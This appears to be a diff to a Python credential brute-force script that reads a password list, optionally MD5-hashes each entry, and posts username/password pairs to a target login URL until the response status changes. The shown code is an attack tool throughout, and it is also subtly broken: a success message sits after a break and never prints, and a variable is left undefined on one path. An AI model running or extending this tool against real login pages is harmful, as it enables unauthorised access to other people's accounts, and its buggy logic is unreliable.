@@ -4,13 +4,14 @@ import threading
 import time
 from encrypt import encode_base64,encrypt_md5
 import requests
+import sys
 
 class Brute():
 
     #TODO:Implement option for username lists
     def __init__(self,host,port,url,passwords_file,pass_enc_type,user_name,wrong_pass_response_status_code = '200'):
         self.target = 'http://' + host + ":" + port + url 
-        print(self.target)
+        print(f'Attempting at {self.target}')
         try:
             passwords_file = open(passwords_file,'r')
             
@@ -28,7 +29,8 @@ class Brute():
     def brutalize(self):
         result=[]
         if self.password_encryption_type:
-            encrypted_passwords = encode_base64(self.passwords_list)
+            encrypted_passwords = encrypt_md5(self.passwords_list)
+        number = len(encrypted_passwords)
         for password in encrypted_passwords:
             payload = {
                 "username":self.username,
@@ -36,7 +38,11 @@ class Brute():
             }
             try:
                 response = requests.post(self.target, data=payload)
-                result.append(f'Tried {password}: response was {response.status_code}')
+                if response.status_code != 200:
+                    break
+                    print(f'Found it : {password}')
+                number -=1
+                print(f"Tried{password}, response was {response.status_code}, {number} left", end='\r' )
             except Exception as e: 
                 return str(e)
             
